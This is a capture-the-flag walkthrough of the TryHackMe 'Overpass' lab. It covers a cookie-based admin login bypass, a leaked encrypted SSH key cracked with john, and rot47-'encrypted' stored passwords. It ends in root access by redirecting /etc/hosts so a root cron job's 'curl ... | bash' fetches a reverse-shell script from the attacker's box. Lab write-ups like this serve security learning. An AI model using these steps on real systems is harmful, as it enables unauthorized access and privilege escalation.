```bash
# PLATFORM          . THM
# CTF NAME          . Overpass 1 
# DESCRIPTION       . What happens when some broke CompSci students make a password manager?
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/overpass
```

```
sudo nmap -sSVC -T5 10.10.189.227 -p- -oN overpass_I
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)

80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Nothing out of the ordinary here, just a `Go` webserver - this might be uncommon for the usual CTF and `ssh` running on port `22`.

- By navigating to the webserver, we can find a brief introduction to a password manager - `overpass` and links to `/downloads`. 

- On the `/downloads` page we can find both binaries for different OSes + the source code of the application.

```overpass.go

cat overpass.go 

package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"

	"github.com/mitchellh/go-homedir"
)

type passListEntry struct {
	Name string `json:"name"`
	Pass string `json:"pass"`
}

//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
	var result []string
	for i := range input[:len(input)] {
		j := int(input[i])
		if (j >= 33) && (j <= 126) {
			result = append(result, string(rune(33+((j+14)%94))))
		} else {
			result = append(result, string(input[i]))
		}
	}
	return strings.Join(result, "")
}

//Encrypt the credentials and write them to a file.
func saveCredsToFile(filepath string, passlist []passListEntry) string {
	file, err := os.OpenFile(filepath, os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(err.Error())
		return err.Error()
	}
	defer file.Close()
	stringToWrite := rot47(credsToJSON(passlist))
	if _, err := file.WriteString(stringToWrite); err != nil {
		fmt.Println(err.Error())
		return err.Error()
	}
	return "Success"
}

//Load the credentials from the encrypted file
func loadCredsFromFile(filepath string) ([]passListEntry, string) {
	buff, err := ioutil.ReadFile(filepath)
	if err != nil {
		fmt.Println(err.Error())
		return nil, "Failed to open or read file"
	}
	//Decrypt passwords
	buff = []byte(rot47(string(buff)))
	//Load decrypted passwords
	var passlist []passListEntry
	err = json.Unmarshal(buff, &passlist)
	if err != nil {
		fmt.Println(err.Error())
		return nil, "Failed to load creds"
	}
	return passlist, "Ok"
}

//Convert the array of credentials to JSON
func credsToJSON(passlist []passListEntry) string {
	jsonBuffer, err := json.Marshal(passlist)
	if err != nil {
		fmt.Println(err.Error())
		return "Something went wrong"
	}
	return string(jsonBuffer)
}

//Python style input function
func input(prompt string) string {
	fmt.Print(prompt)
	scanner := bufio.NewScanner(os.Stdin)
	if scanner.Scan() {
		return scanner.Text()

	}
	return ""
}

func serviceSearch(passlist []passListEntry, serviceName string) (int, passListEntry) {
	//A linear search is the best I can do, Steve says it's Oh Log N whatever that means
	for index, entry := range passlist {
		if entry.Name == serviceName {
			return index, entry
		}
	}
	return -1, passListEntry{}
}

func getPwdForService(passlist []passListEntry, serviceName string) string {
	index, entry := serviceSearch(passlist, serviceName)
	if index != -1 {
		return entry.Pass
	}
	return "Pass not found"
}

func setPwdForService(passlist []passListEntry, serviceName string, newPwd string) []passListEntry {
	index, entry := serviceSearch(passlist, serviceName)
	//If service exists, update entry
	if index != -1 {
		entry.Pass = newPwd
		passlist[index] = entry
		return passlist
	}
	//If it doesn't, create an entry
	entry = passListEntry{Name: serviceName, Pass: newPwd}
	passlist = append(passlist, entry)
	return passlist
}

func deletePwdByService(passlist []passListEntry, serviceName string) (resultList []passListEntry, status string) {
	index, _ := serviceSearch(passlist, serviceName)
	if index != -1 {
		//remove Pwd from passlist
		resultList = append(passlist[:index], passlist[index+1:]...)
		status = "Ok"
		return
	}
	return passlist, "Pass not found"
}

func printAllPasswords(passlist []passListEntry) {
	for _, entry := range passlist {
		fmt.Println(entry.Name, "\t", entry.Pass)
	}
}

func main() {
	credsPath, err := homedir.Expand("~/.overpass")
	if err != nil {
		fmt.Println("Error finding home path:", err.Error())
	}
	//Load credentials
	passlist, status := loadCredsFromFile(credsPath)
	if status != "Ok" {
		fmt.Println(status)
		fmt.Println("Continuing with new password file.")
		passlist = make([]passListEntry, 0)
	}

	fmt.Println("Welcome to Overpass")

	//Determine function
	option := -1
	fmt.Print(
		"Options:\n" +
			"1\tRetrieve Password For Service\n" +
			"2\tSet or Update Password For Service\n" +
			"3\tDelete Password For Service\n" +
			"4\tRetrieve All Passwords\n" +
			"5\tExit\n")

	for option > 5 || option < 1 {
		optionString := input("Choose an option:\t")
		optionChoice, err := strconv.Atoi(optionString)
		if err != nil || optionChoice > 5 || optionChoice < 1 {
			fmt.Println("Please enter a valid number")
		}
		option = optionChoice
	}

	switch option {
	case 1:
		service := input("Enter Service Name:\t")
		getPwdForService(passlist, service)
	case 2:
		service := input("Enter Service Name:\t")
		newPwd := input("Enter new password:\t")
		passlist = setPwdForService(passlist, service, newPwd)
		saveCredsToFile(credsPath, passlist)
	case 3:
		service := input("Enter Service Name:\t")
		passlist, status := deletePwdByService(passlist, service)
		if status != "Ok" {
			fmt.Println(status)
		}
		saveCredsToFile(credsPath, passlist)
	case 4:
		printAllPasswords(passlist)
	}
}
```

- I've started `fuzzing` the webserver for more potential `endpoints` available. 

- This would quickly reveal something interesting: 

```
login.js                [Status: 200, Size: 1779, Words: 345, Lines: 43]
downloads               [Status: 301, Size: 0, Words: 1, Lines: 1]
main.js                 [Status: 200, Size: 28, Words: 2, Lines: 1]
aboutus                 [Status: 301, Size: 0, Words: 1, Lines: 1]
admin                   [Status: 301, Size: 42, Words: 3, Lines: 3]
css                     [Status: 301, Size: 0, Words: 1, Lines: 1]
cookie.js               [Status: 200, Size: 1502, Words: 41, Lines: 3]
```

- Going to `/admin` page - we find a login panel which may or may not be vulnerable to SQL injection. 

- However, let's check `login.js` and `cookie.js` too.

- `cookie.js` reveals nothing particularly interesting but `login.js` it's the jackpot.

```login.js
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

- The last block of code is related to previously discovered `/admin` endpoint and the entire `login logic` seems to be written here: if `SessionToken` cookie is set, then allow login. 

- But it doesn't seem to check for a certain value of the `SessionToken`.

![[Pasted image 20231123175332.png]]

- After setting a random value, I've refreshed the page and I was allowed in.

```bash
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.  
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
							{redacted}
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

- So we got the `private RSA key` and a username, `james`.

- After `chmod 600` to the `id_rsa` (the file I saved the key in), we're prompted for passphase:

```bash
ssh -i id_rsa james@10.10.189.227
Enter passphrase for key 'id_rsa': 
```

```bash
python3 /opt/john/run/ssh2john.py id_rsa > id_rsa_hash
```

```bash
/opt/john/run/john id_rsa_hash -w=/usr/share/wordlists/rockyou.txt
```

```
{redacted}          (id_rsa)
```

- The flag is located at `/home/james/user.txt`

- In the `/home/james` path there's also a `todo.txt`

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

- Giving the above `todo` list, I've looked for `*overpass*` files on the filesystem.

```bash
find / -name *overpass* 2>/dev/null
```

```
/usr/bin/overpass
/home/james/.overpass
```

```
cat .overpass 

,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```


- By examining the `source code` of the application, we can see that the characters in passwords are rotated 47 times using the `rot-47` algorithm before being stored in the file.

```
func rot47(input string) string {
	var result []string
	for i := range input[:len(input)] {
		j := int(input[i])
		if (j >= 33) && (j <= 126) {
			result = append(result, string(rune(33+((j+14)%94))))
		} else {
			result = append(result, string(input[i]))
		}
	}
	return strings.Join(result, "")
}
```

- Using [this](https://www.dcode.fr/rot-47-cipher) tool, I've deciphered the stored information in the `.overpass` file

```
[{"name":"System","pass":"say{redacted}ure"}]
```

- The name indicates that this might be the `root` password, so I'll have a try with `sudo`.

- I had to luck, but by reading the `todo.txt` file one more time, I got it: `Write down my password somewhere on a sticky note so that I don't forget it.`. So `say{redacted}ure` is actually `james password`

**NOTE**: the same password could've been grabbed by running `/usr/bin/overpass` with `option 4 : Retrieve All Passwords `

- Upon further lookup on the system, I've noticed that there's a job in the `/etc/crontab` that pulls the `buildscript.sh` from `overpass.thm`.

- `overpass.thm` is just `127.0.0.1` in `/etc/hosts` file.

```
james@overpass-prod:/etc$ cat /etc/crontab

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

james@overpass-prod:/etc$ cat /etc/hosts

127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
```

- I think I've overthinked this a little, but I tried:

	- writing to `/etc/crontab` file.
	
	- **HERE it came to my mind that I could just edit the /etc/hosts file to point to my attack box and let cron just take the modified file from my box but i've checked the permissions with ls -l and the file was under root so I believed I don't have permissions to write to it. BIG MISTAKE.**

	- So I've continued:

	- Remember this was a go server? I've found the server files in `/usr/local/go`, but couldn't find where the files from downloads are.

	- - downloading the `buildscript.sh` from `ip/downloads/src/` on my attack box.

		- modify the content to a reverse shell and upload it to `ip/downloads/src` using `curl -X POST -F "file=@/home/madalinux/buildscript.sh" http://10.10.189.227/downloads/src`

	- downloading the `buildscript.sh` on the target host, saving it to `/home/james`, modify it to a reverse shell and trying the same `curl` command, but replacing the `ip` with `overpass.thm`

	- Finished a university course.

	- I tried to replace my own ip in `/etc/hosts` file just because I was out of ideas. And it worked :) 

- On my attack box, I've created `/downloads/src` folders and placed the `buildscript.sh` executable file inside. (containing a reverse shell).

- Started a python webserver using `python3 -m http.server 80` and started a listener on the chosen port.

- After a short while, I had a revere shell under root on the victim machine. 

- The final flag is in `/root/root.txt`.

